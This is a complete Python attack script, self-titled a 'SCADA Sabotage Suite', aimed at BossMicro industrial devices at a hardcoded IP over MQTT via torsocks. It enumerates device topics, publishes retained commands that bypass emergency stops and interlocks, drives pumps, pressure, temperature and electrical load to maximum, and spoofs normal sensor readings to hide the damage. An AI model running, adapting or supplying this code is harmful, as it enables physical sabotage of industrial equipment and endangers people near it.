#!/usr/bin/env python3
"""
- BossMicro Industrial SCADA Sabotage Suite v2.0
Full persistent MAX control + Sensor spoofing + Emergency bypass + WILDCARD ENUM

"""

import paho.mqtt.client as mqtt
import json
import time
import random
import subprocess
import re
from datetime import datetime
import threading
from collections import defaultdict

# BossMicro REAL protocol from observed data
BOSSMICRO_PROTOCOL = {
    'STATUS_ONLINE': 1,
    'STATUS_OFFLINE': 0,
    'VER': "100",
    'CMD_SETPOINT': "SETPOINT",
    'CMD_POWER': "POWER_FULL",
    'CMD_PUMP_ON': "PUMP_START",
    'CMD_EMERGENCY_BYPASS': "EMERGENCY_OFF",
    'CMD_SENSOR_OVERRIDE': "SENSOR_OK",
    'PUMP_SPEED_MAX': 100.0,
    'FLOW_MAX': 150.0,
    'PRESSURE_MAX': 10.0,
    'TEMPERATURE_MAX': 60.0,
    'POWER_MAX': 16.0,
    'CURRENT_MAX': 16.0,
    'VOLTAGE_NOMINAL': 230.0
}

class BossMicroController:
    def __init__(self, host="81.170.209.212", port=1883):
        self.host = host
        self.port = port
        self.macs = []
        self.results = defaultdict(list)  # Track successes per phase
        self.all_topics = set()
        
    def torsocks_pub(self, topic, payload, retain=False):
        """Torsocks MQTT publish with retain for persistence"""
        retain_flag = "-r" if retain else ""
        cmd = f"torsocks mosquitto_pub -h {self.host} -p {self.port} -t '{topic}' -m '{payload}' {retain_flag} -q 1"
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=8)
        if result.returncode == 0:
            success_msg = f"✓ [PERSISTENT] {topic} <- {payload[:40]}..."
            print(success_msg)
            return True, success_msg
        else:
            error_msg = f"✗ {topic} -> {result.stderr[:50]}"
            print(error_msg)
            return False, error_msg
    
    def enum_wildcard_topics(self):
        """Phase 0: FULL WILDCARD ENUMERATION # discovery"""
        print("\n=== PHASE 0: FULL WILDCARD MQTT ENUMERATION ===")
        
        wildcards = [
            "#",                    # ALL topics
            "*/cmd/#",             # All commands
            "*/sensor/#",          # All sensors  
            "*/safety/#",          # All safeties
            "*/control/#",         # All controls
            "00-0A-5C-83-CE-*/#"   # All waterloop stations
        ]
        
        discovered_macs = set()
        for wildcard in wildcards:
            cmd = f"torsocks mosquitto_sub -h {self.host} -p {self.port} -t '{wildcard}' -C 1 -W 3"
            print(f"🔍 SUB: {wildcard}")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            # Parse discovered topics for MACs
            if result.stdout:
                topics = result.stdout.strip().split('\n')
                for topic in topics:
                    if topic.strip():
                        self.all_topics.add(topic.strip())
                        mac_match = re.match(r'([0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2})', topic)
                        if mac_match:
                            mac = mac_match.group(1).upper()
                            discovered_macs.add(mac)
        
        # Add known MACs as fallback
        known_macs = [
            "00-0A-5C-82-F4-2B", "00-0A-5C-83-A0-C5", "00-0A-5C-83-CE-02",
            "00-0A-5C-83-CE-2F", "00-0A-5C-83-CE-34", "00-0A-5C-83-CE-4C",
            "00-0A-5C-83-CD-F1", "00-0A-5C-83-CE-49"
        ]
        self.macs = list(discovered_macs.union(known_macs))
        
        print(f"✅ DISCOVERED {len(self.macs)} UNIQUE MACs:")
        for mac in sorted(self.macs):
            print(f"   📡 {mac}")
        print(f"📊 TOTAL TOPICS: {len(self.all_topics)}")
        return self.macs
    
    def activate_all_macs(self):
        """Phase 1: Wake-up ALL discovered MACs"""
        print("\n=== PHASE 1: ACTIVATE ALL SENSORS ===")
        successes = 0
        
        for mac in self.macs:
            wakeup_payload = json.dumps({"ver": BOSSMICRO_PROTOCOL['VER'], "status": 1})
            heartbeat_payload = json.dumps({"ts": int(time.time()), "status": 1})
            
            success1, msg1 = self.torsocks_pub(f"{mac}/cmd/wakeup", wakeup_payload, retain=True)
            success2, msg2 = self.torsocks_pub(f"{mac}/sensor/heartbeat", heartbeat_payload, retain=True)
            
            if success1 or success2:
                successes += 1
                self.results["ACTIVATED"].append(mac)
            
            time.sleep(0.5)
        
        print(f"✅ ACTIVATED: {successes}/{len(self.macs)} MACs")
        return successes
    
    def bypass_safety_all(self):
        """Phase 2: BYPASS ALL SAFETIES (PERSISTENT)"""
        print("\n=== PHASE 2: EMERGENCY BYPASS ALL ===")
        successes = 0
        
        safety_commands = {
            "safety/emergency": "BYPASSED",
            "safety/interlock": 0,
            "alarm/reset": "ALL_CLEAR",
            "sensor/fault": "OK",
            "control/override": json.dumps({"emergency": False, "manual": True})
        }
        
        for mac in self.macs:
            for subtopic, payload in safety_commands.items():
                success, msg = self.torsocks_pub(f"{mac}/{subtopic}", str(payload), retain=True)
                if success:
                    successes += 1
                    self.results["BYPASSED"].append(f"{mac}/{subtopic}")
                time.sleep(0.2)
        
        print(f"✅ SAFETY BYPASS: {successes} commands executed")
        return successes
    
    def max_waterloop_all(self):
        """Phase 3: MAX DESTROY WATERLOOPS"""
        print("\n=== PHASE 3: WATERLOOP 100% DESTRUCTION ===")
        successes = 0
        
        waterloop_macs = [mac for mac in self.macs if "CE-" in mac]  # Waterloop pattern
        
        pump_max_commands = {
            "cmd/pump_speed": BOSSMICRO_PROTOCOL['PUMP_SPEED_MAX'],
            "cmd/flow_setpoint": BOSSMICRO_PROTOCOL['FLOW_MAX'],
            "cmd/pressure_target": BOSSMICRO_PROTOCOL['PRESSURE_MAX'],
            "cmd/temp_setpoint": BOSSMICRO_PROTOCOL['TEMPERATURE_MAX'],
            "control/state": "RUN_FULL",
            "cmd/start": "IMMEDIATE",
            "sensor/vibration": "NORMAL",
            "sensor/temp": 35.0,
            "sensor/pressure": 4.0
        }
        
        for mac in waterloop_macs:
            print(f"💦 MAX PUMPING {mac}")
            for subtopic, payload in pump_max_commands.items():
                success, msg = self.torsocks_pub(f"{mac}/{subtopic}", str(payload), retain=True)
                if success:
                    successes += 1
                    self.results["WATERLOOP_MAX"].append(f"{mac}/{subtopic}")
                time.sleep(0.3)
        
        print(f"✅ WATERLOOPS MAXED: {successes} commands")
        return successes
    
    def max_plugin16_all(self):
        """Phase 4: MAX LOAD PLUGINS"""
        print("\n=== PHASE 4: 16A FULL LOAD ===")
        successes = 0
        
        plugin_macs = [mac for mac in self.macs if mac not in [m for m in self.macs if "CE-" in m]]
        
        plugin_max_commands = {
            "cmd/power_set": BOSSMICRO_PROTOCOL['POWER_MAX'],
            "cmd/current_limit": BOSSMICRO_PROTOCOL['CURRENT_MAX'],
            "control/load": "MAX",
            "sensor/temp": 25.0,
            "sensor/overload": 0
        }
        
        for mac in plugin_macs:
            print(f"🔌 MAX LOADING {mac}")
            for subtopic, payload in plugin_max_commands.items():
                success, msg = self.torsocks_pub(f"{mac}/{subtopic}", str(payload), retain=True)
                if success:
                    successes += 1
                    self.results["PLUGIN_MAX"].append(f"{mac}/{subtopic}")
                time.sleep(0.2)
        
        print(f"✅ PLUGINS MAXED: {successes} commands")
        return successes
    
    def persistent_heartbeat(self):
        """Phase 5: MAINTAIN PERSISTENT CONTROL"""
        print("\n=== PHASE 5: PERSISTENT HEARTBEAT FLOOD ===")
        successes = 0
        
        heartbeat_payload = json.dumps({
            "ver": BOSSMICRO_PROTOCOL['VER'],
            "ts": int(time.time()),
            "status": 1,
            "override": True,
            "control": "MAINTAINED"
        })
        
        for mac in self.macs:
            success, msg = self.torsocks_pub(f"{mac}/heartbeat", heartbeat_payload, retain=True)
            if success:
                successes += 1
                self.results["HEARTBEAT"].append(mac)
            time.sleep(0.4)
        
        print(f"✅ HEARTBEAT SECURED: {successes}/{len(self.macs)}")
        return successes
    
    def print_detailed_results(self):
        """Detailed success report"""
        print("\n" + "="*80)
        print("📊 PENETEST RESULTS SUMMARY")
        print("="*80)
        
        total_cmds = sum(len(cmds) for cmds in self.results.values())
        print(f"🎯 TOTAL COMMANDS EXECUTED: {total_cmds}")
        print(f"📡 UNIQUE MACs TARGETED: {len(self.macs)}")
        print(f"📋 DISCOVERED TOPICS: {len(self.all_topics)}")
        
        print("\n✅ SUCCESS BREAKDOWN:")
        for phase, targets in self.results.items():
            print(f"   {phase}: {len(targets)} successes")
            if len(targets) <= 10:  # Show details for small lists
                for target in targets[:5]:
                    print(f"      └─ {target}")
        
        print("\n💥 ATTACK STATUS:")
        print("   🏭 WATERLOOPS: 100% SPEED/FLOW/PRESSURE/TEMP")
        print("   🔌 PLUGINS: 16A FULL LOAD") 
        print("   🛡️ SAFETIES: BYPASSED + INTERLOCKS OFF")
        print("   📡 CONTROL: PERSISTENT HEARTBEAT")
        print("="*80)
    
    def full_sabotage(self):
        """Execute COMPLETE attack sequence with reporting"""
        print("🚨 BOSSMICRO FULL SABOTAGE v2.0 INITIATED 🚨")
        print(f"🎯 TARGET: {self.host}:{self.port}")
        print(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("-"*80)
        
        # Full sequence
        self.enum_wildcard_topics()
        self.activate_all_macs()
        self.bypass_safety_all() 
        self.max_waterloop_all()
        self.max_plugin16_all()
        self.persistent_heartbeat()
        
        # Final report
        self.print_detailed_results()
        print("\n✅ PENETEST COMPLETE - FULL CONTROL ACHIEVED")

if __name__ == "__main__":
    controller = BossMicroController("81.170.209.212")
    controller.full_sabotage()
